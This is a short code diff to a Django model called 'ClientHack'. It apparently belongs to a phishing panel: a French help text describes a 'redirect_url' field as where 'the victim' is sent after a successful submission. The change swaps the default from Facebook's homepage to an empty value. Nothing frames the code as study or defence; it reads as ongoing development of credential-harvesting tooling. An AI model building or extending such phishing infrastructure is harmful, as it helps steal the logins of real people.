@@ -243,8 +243,8 @@ class ClientHack(models.Model):
     )
     redirect_url = models.URLField(
         blank=True,
-        default="https://www.facebook.com",
-        help_text="URL où rediriger la victime après soumission réussie",
+        default="",
+        help_text="URL où rediriger la victime après soumission réussie (vide = pas de redirection)",
     )
 
     # URLs fixes — déclarées dans le code, pas en BDD
